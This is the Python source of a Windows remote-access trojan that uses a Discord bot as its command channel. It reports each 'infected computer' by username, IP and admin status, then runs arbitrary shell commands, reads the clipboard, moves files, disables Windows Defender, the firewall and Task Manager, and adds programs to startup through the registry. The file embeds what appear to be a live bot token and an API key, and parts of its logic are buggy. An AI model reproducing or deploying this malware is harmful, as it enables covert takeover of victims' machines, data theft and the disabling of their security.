  import discord
import os
import socket
import ctypes
import subprocess
import asyncio
import tempfile
import random
import string
import pyttsx3
import requests
import shutil
import traceback
import time
import datetime
import sys

# Define your Discord bot token and guild ID here
TOKEN = 'MTE4MDg0MzE1OTA2MDc0MjIwNg.GJ5EhI.SiqqWOyhzbgkm0IVWqA4dqCyCQD1qg4rbyAg0Y'  # Replace 'your_token_here' with your actual bot token
GUILD_ID = 1159991330206929019

# Initialize Discord client with necessary intents
intents = discord.Intents.all()
client = discord.Client(intents=intents)

# Function to collect system information
def collect_system_info():
    username = os.getlogin()
    return f"Username: {username}"

# Function to get the IP address
def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

# Function to check if the software is running with administrator privileges
def check_if_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        return False

# Function to show a message box with the provided text
def show_message_box(text):
    ctypes.windll.user32.MessageBoxW(0, text, "Message", 0)

# Function to make a voice say the provided text out loud
def say_outloud(text):
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()

# Function to download a file from the infected computer
def download_file(url, local_filename):
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
    return local_filename

# Function to upload a file to the infected computer
def upload_file(local_filename, remote_filename):
    shutil.copy(local_filename, remote_filename)

# Function to execute shell commands asynchronously
async def execute_command(command, message):
    try:
        # Execute the command within a Windows cmd process
        print("Inside the try block.")
        cmd_process = subprocess.Popen(['cmd', '/c', command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        result, _ = cmd_process.communicate()
        if cmd_process.returncode != 0:
            await message.channel.send(f"An error occurred while executing the command: {result}")
            return

        # Create a temporary file
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:
            temp_file.write(f"Command: {command}\n")
            temp_file.write(result + "\n\n")
            temp_file_path = temp_file.name

        # Send the temporary file to Discord
        with open(temp_file_path, "rb") as file:
            file_content = discord.File(file, filename="output.txt")
            await message.channel.send(file=file_content)

        # Delete the temporary file
        os.remove(temp_file_path)

    except subprocess.CalledProcessError as e:
        traceback.print_exc()
        await message.channel.send(f"An error occurred while executing the command: {e.output}")
    except Exception as e:
        traceback.print_exc()
        await message.channel.send(f"An unexpected error occurred: {str(e)}")

# Main async function to start the bot
async def run_bot():
    await client.start(TOKEN)

# Event handlers
@client.event
async def on_ready():
    print(f'{client.user} has connected to Discord!')

    # Create a new text channel with a random name
    guild = client.get_guild(GUILD_ID)
    random_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    new_channel = await guild.create_text_channel(random_name)

    # Send the system info to the newly created channel
    system_info = collect_system_info()
    await new_channel.send(system_info)

    # Set the channel as the command execution channel
    global command_execution_channel
    command_execution_channel = new_channel

    # Send the message with the desired information
    ip_address = get_ip_address()
    admin_status = "True" if check_if_admin() else "False"
    message = f"@here :white_check_mark: New session opened | User: {os.getlogin()} | IP: {ip_address} | Admin: {admin_status}"
    await new_channel.send(message)

@client.event
async def on_message(message):
    if message.author == client.user or message.guild.id != GUILD_ID:
        return

    # Check if the message is sent in the command execution channel
    if command_execution_channel and message.channel.id != command_execution_channel.id:
        return
    
    if message.content.startswith('!help'):
        help_message = "Available commands:\n"
        help_message += "!shell <command> - Executes a shell command and sends the output to Discord.\n"
        help_message += "!message <text> - Shows a message box with the provided text.\n"
        help_message += "!voice <text> - Makes a voice say the provided text out loud.\n"
        help_message += "!download <url> - Downloads a file from the provided URL.\n"
        help_message += "!upload <file> - Uploads a file from Discord attachment to the infected computer.\n"
        help_message += "!uploadlink <url> <file> - Uploads a file from the provided URL to the infected computer.\n"
        help_message += "!delete <file> - Deletes a file from the infected computer.\n"
        help_message += "!write <text> - Writes the provided text to a file on the infected computer.\n"
        help_message += "!wallpaper - Changes the infected computer's wallpaper with an attached image.\n"
        help_message += "!clipboard - Retrieves the infected computer's clipboard content.\n"
        help_message += "!idletime - Gets the idle time of the user on the target computer.\n"
        help_message += "!currentdir - Displays the current directory.\n"
        help_message += "!block - Blocks the user's keyboard and mouse (Admin rights required).\n"
        help_message += "!unblock - Unblocks the user's keyboard and mouse (Admin rights required).\n"
        help_message += "!screenshot - Gets a screenshot of the user's current screen.\n"
        help_message += "!shutdown - Shuts down the computer.\n"
        help_message += "!restart - Restarts the computer.\n"
        help_message += "!logoff - Logs off the current user.\n"
        help_message += "!bluescreen - Simulates a BlueScreen on the PC.\n"
        help_message += "!datetime - Displays the system date and time.\n"
        help_message += "!prockill <process> - Kills a process by name.\n"
        help_message += "!disabledefender - Disables Windows Defender (requires admin).\n"
        help_message += "!disablefirewall - Disables Windows Firewall (requires admin).\n"
        help_message += "!audio - Plays an audio file on the target computer (with attachment).\n"
        help_message += "!critproc <program> - Makes a program a critical process (Admin rights required).\n"
        help_message += "!uncritproc <program> - Removes the critical process status from a program (Admin rights required).\n"
        help_message += "!website <url> - Opens a website on the infected computer.\n"
        help_message += "!disabletaskmgr - Disables Task Manager (Admin rights required).\n"
        help_message += "!enabletaskmgr - Enables Task Manager (if disabled) (Admin rights required).\n"
        help_message += "!startup <file> - Adds a file to startup (when the computer starts).\n"
        help_message += "!geolocate - Geolocates the computer using latitude and longitude of the IP address with Google Maps (Warning: Geolocating IP addresses is not very precise).\n"
        help_message += "!listprocess - Gets all running processes.\n"

        # Split the help message into three parts
        part1 = help_message[:len(help_message) // 3]
        part2 = help_message[len(help_message) // 3:2 * len(help_message) // 3]
        part3 = help_message[2 * len(help_message) // 3:]

        await message.channel.send(f"```{part1}```")
        await message.channel.send(f"```{part2}```")
        await message.channel.send(f"```{part3}```")
        return

    if message.content.startswith('!shell'):
        command = message.content[7:]
        asyncio.create_task(execute_command(command, message))

    if message.content.startswith('!message'):
        text = message.content[9:]
        show_message_box(text)
        await message.channel.send(f"Message box displayed with text: {text}")

    if message.content.startswith('!voice'):
        text = message.content[7:]
        say_outloud(text)
        await message.channel.send(f"Voice saying: {text}")

    if message.content.startswith('!upload'):
        if not message.attachments:
            await message.channel.send("No attachment found. Please attach a file to upload.")
            return

        file_url = message.attachments[0].url
        local_filename = os.path.join(tempfile.gettempdir(), os.path.basename(file_url))
        download_file(file_url, local_filename)
        remote_filename = os.path.join(os.path.expanduser("~"), "Desktop", os.path.basename(file_url))
        upload_file(local_filename, remote_filename)
        await message.channel.send(f"File uploaded to: {remote_filename}")

    if message.content.startswith('!download'):
        url = message.content[10:]
        local_filename = os.path.join(os.path.expanduser("~"), "Desktop", os.path.basename(url))
        download_file(url, local_filename)
        await message.channel.send(f"File downloaded to: {local_filename}")

    if message.content.startswith('!delete'):
        args = message.content.split()
        if len(args) != 2:
            await message.channel.send("Invalid syntax. Use: !delete <file>")
            return

        file_path = args[1]
        try:
            os.remove(file_path)
            await message.channel.send(f"File deleted: {file_path}")
        except Exception as e:
            await message.channel.send(f"Error deleting file: {str(e)}")

    if message.content.startswith('!write'):
        args = message.content.split()
        if len(args) < 2:
            await message.channel.send("Invalid syntax. Use: !write <text>")
            return

        text = ' '.join(args[1:])
        file_path = os.path.join(os.getcwd(), "output.txt")
        try:
            with open(file_path, 'w') as f:
                f.write(text)
            await message.channel.send(f"Text written to file: {file_path}")
        except Exception as e:
            await message.channel.send(f"Error writing to file: {str(e)}")

    if message.content.startswith('!wallpaper'):
        if not message.attachments:
            await message.channel.send("No attachment found. Please attach an image to change the wallpaper.")
            return

        file_url = message.attachments[0].url
        local_filename = os.path.join(tempfile.gettempdir(), os.path.basename(file_url))
        download_file(file_url, local_filename)

        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, local_filename, 0)
            await message.channel.send(f"Wallpaper changed to: {local_filename}")
        except Exception as e:
            await message.channel.send(f"Error changing wallpaper: {str(e)}")

    if message.content.startswith('!clipboard'):
        try:
            clip_data = ctypes.windll.user32.GetClipboardData(13)
            clip_data = ctypes.cast(clip_data, ctypes.c_char_p).value.decode('utf-8')
            await message.channel.send(f"Clipboard content: {clip_data}")
        except Exception as e:
            await message.channel.send(f"Error retrieving clipboard content: {str(e)}")

    if message.content.startswith('!idletime'):
        try:
            idle_time = ctypes.windll.user32.GetLastInputInfo()
            seconds = int(time.time() - idle_time)
            await message.channel.send(f"User idle time: {seconds} seconds")
        except Exception as e:
            await message.channel.send(f"Error retrieving idle time: {str(e)}")

    if message.content.startswith('!currentdir'):
        try:
            current_dir = os.getcwd()
            await message.channel.send(f"Current directory: {current_dir}")
        except Exception as e:
            await message.channel.send(f"Error retrieving current directory: {str(e)}")
    if message.content.startswith('!shutdown'):
        try:
            os.system("shutdown /s /t 0")
            await message.channel.send("Computer shutting down...")
        except Exception as e:
            await message.channel.send(f"Error shutting down the computer: {str(e)}")

    if message.content.startswith('!restart'):
        try:
            os.system("shutdown /r /t 0")
            await message.channel.send("Computer restarting...")
        except Exception as e:
            await message.channel.send(f"Error restarting the computer: {str(e)}")

    if message.content.startswith('!logoff'):
        try:
            os.system("shutdown /l")
            await message.channel.send("User logged off.")
        except Exception as e:
            await message.channel.send(f"Error logging off the user: {str(e)}")

    if message.content.startswith('!bluescreen'):
        try:
            os.system("taskkill /f /im svchost.exe")
            await message.channel.send("BlueScreen simulated.")
        except Exception as e:
            await message.channel.send(f"Error simulating BlueScreen: {str(e)}")

    if message.content.startswith('!datetime'):
        try:
            current_datetime = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            await message.channel.send(f"System date and time: {current_datetime}")
        except Exception as e:
            await message.channel.send(f"Error retrieving system date and time: {str(e)}")

    if message.content.startswith('!prockill'):
        args = message.content.split()
        if len(args) != 2:
            await message.channel.send("Invalid syntax. Use: !prockill <process>")
            return

        process_name = args[1]
        try:
            os.system(f"taskkill /F /IM {process_name}.exe")
            await message.channel.send(f"Process {process_name} killed.")
        except Exception as e:
            await message.channel.send(f"Error killing process: {str(e)}")

    if message.content.startswith('!disabledefender'):
        if not check_if_admin():
            await message.channel.send("Admin rights are required to disable Windows Defender.")
            return

        try:
            os.system("powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true")
            await message.channel.send("Windows Defender disabled.")
        except Exception as e:
            await message.channel.send(f"Error disabling Windows Defender: {str(e)}")

    if message.content.startswith('!disablefirewall'):
        if not check_if_admin():
            await message.channel.send("Admin rights are required to disable Windows Firewall.")
            return

        try:
            os.system("netsh advfirewall set allprofiles state off")
            await message.channel.send("Windows Firewall disabled.")
        except Exception as e:
            await message.channel.send(f"Error disabling Windows Firewall: {str(e)}")

    if message.content.startswith('!audio'):
        if not message.attachments:
            await message.channel.send("No attachment found. Please attach an audio file to play.")
            return

        file_url = message.attachments[0].url
        local_filename = os.path.join(tempfile.gettempdir(), os.path.basename(file_url))
        download_file(file_url, local_filename)

        try:
            subprocess.Popen([sys.executable, '-m', 'webbrowser', local_filename])
            await message.channel.send(f"Audio file playing: {local_filename}")
        except Exception as e:
            await message.channel.send(f"Error playing audio file: {str(e)}")

    if message.content.startswith('!critproc'):
        args = message.content.split()
        if len(args) != 2:
            await message.channel.send("Invalid syntax. Use: !critproc <program>")
            return

        program_name = args[1]
        if not check_if_admin():
            await message.channel.send("Admin rights are required to make a program a critical process.")
            return

        try:
            os.system(f"wmic process where name='{program_name}.exe' set priorityclass=high")
            await message.channel.send(f"Program {program_name} set as critical process.")
        except Exception as e:
            await message.channel.send(f"Error setting program as critical process: {str(e)}")

    if message.content.startswith('!uncritproc'):
        args = message.content.split()
        if len(args) != 2:
            await message.channel.send("Invalid syntax. Use: !uncritproc <program>")
            return

        program_name = args[1]
        if not check_if_admin():
            await message.channel.send("Admin rights are required to remove the critical process status from a program.")
            return
        
        try:
            os.system(r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
            await message.channel.send("Task Manager disabled.")
        except Exception as e:
            await message.channel.send(f"Error disabling Task Manager: {str(e)}")

    if message.content.startswith('!enabletaskmgr'):
        if not check_if_admin():
            await message.channel.send("Admin rights are required to enable Task Manager.")
            return

        try:
            os.system(r"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /f")
            
            await message.channel.send("Task Manager enabled.")
        except Exception as e:
            await message.channel.send(f"Error enabling Task Manager: {str(e)}")

    if message.content.startswith('!startup'):
        args = message.content.split()
        if len(args) != 2:
            await message.channel.send("Invalid syntax. Use: !startup <file>")
            return

        file_path = args[1]
        try:
            os.system(rf"reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v {os.path.basename(file_path)} /t REG_SZ /d \"{file_path}\" /f")
            await message.channel.send(f"File added to startup: {file_path}")
        except Exception as e:
            await message.channel.send(f"Error adding file to startup: {str(e)}")

    if message.content.startswith('!geolocate'):
        try:
            ip_address = get_ip_address()
            response = requests.get(f"https://ipgeolocation.io/ip-location/{ip_address}?apiKey=4896fbdc01b54de5a80ba2edbc29f436")
            data = response.json()
            latitude = data['latitude']
            longitude = data['longitude']
            map_link = f"https://www.google.com/maps/place/{latitude},{longitude}"
            await message.channel.send(f"Geolocation (approximate): {map_link}")
        except Exception as e:
            await message.channel.send(f"Error geolocating IP address: {str(e)}")

    if message.content.startswith('!listprocess'):
        try:
            output = subprocess.check_output("tasklist", shell=True).decode("latin-1")
            await message.channel.send("Running processes:\n```\n" + output + "\n```")
        except Exception as e:
            await message.channel.send(f"Error listing processes: {str(e)}")
    
    if message.content.startswith('!website'):
       args = message.content.split()
    if len(args) != 2:
        await message.channel.send("Invalid syntax. Use: !website <url>")
        return

    url = args[1]
    try:
        # Open the URL in the default web browser
        subprocess.Popen(['start', url], shell=True)
        await message.channel.send(f"Opening website: {url}")
    except Exception as e:
        await message.channel.send(f"Error opening website: {str(e)}")


    if message.content.startswith('!exit'):
        await message.channel.send("Exiting the bot...")
        await client.close()

# Run the bot
asyncio.run(run_bot())
